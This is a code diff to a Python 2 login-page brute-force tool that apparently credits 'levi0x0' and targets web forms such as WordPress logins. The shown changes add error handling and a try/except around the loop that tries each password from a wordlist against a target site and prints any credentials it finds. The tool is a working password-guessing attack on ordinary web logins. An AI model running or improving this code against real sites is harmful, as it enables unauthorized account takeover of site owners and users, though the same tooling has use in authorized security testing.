@@ -93,12 +93,15 @@ def main(  target, user_tag, user, pass_tag, passwords, submit_tag, submit, log_
 			print "==>User: %s Password: %s |Login Faild!" % ( user, passwords )
 		else:
 			pass
-	else:
+	elif search( log_err, response ) == None:
 		print "\n* Login Found!"
 		print "[+]User: %s" % (user)
 		print "[+]Password: %s\n" % (passwords)
 		print "\nsb0x Login Page BruteForce by levi0x0 (httPS://youtube.com/levi0x0)\n"
 		quit()
+	else:
+		print "[-]ERROR try again...."
+		sys.exit()
 		
 for arg in sys.argv:
 	if arg == "--help" or arg =="-h":
@@ -191,8 +194,16 @@ if user_tag == "log" and pass_tag == "pwd" and submit_tag == "wp-submit":
 else:
 	print "[*] CMS :Unknown\n"
 
-for p in passw:
-	main( target, user_tag, user, pass_tag, p.replace('\n', ''), submit_tag, submit, log_err)
-print "\n[!]Done.."
-sys.exit()
+try:
+	for p in passw:
+		main( target, user_tag, user, pass_tag, p.replace('\n', ''), submit_tag, submit, log_err)
+	print "\n[!]Done.."
+	sys.exit()
+except KeyboardInterrupt:
+	print "[-]bye (:"
+	sys.exit()
+
+except:
+	print "[-]got error! ):"
+	sys.exit()
 #!EOF
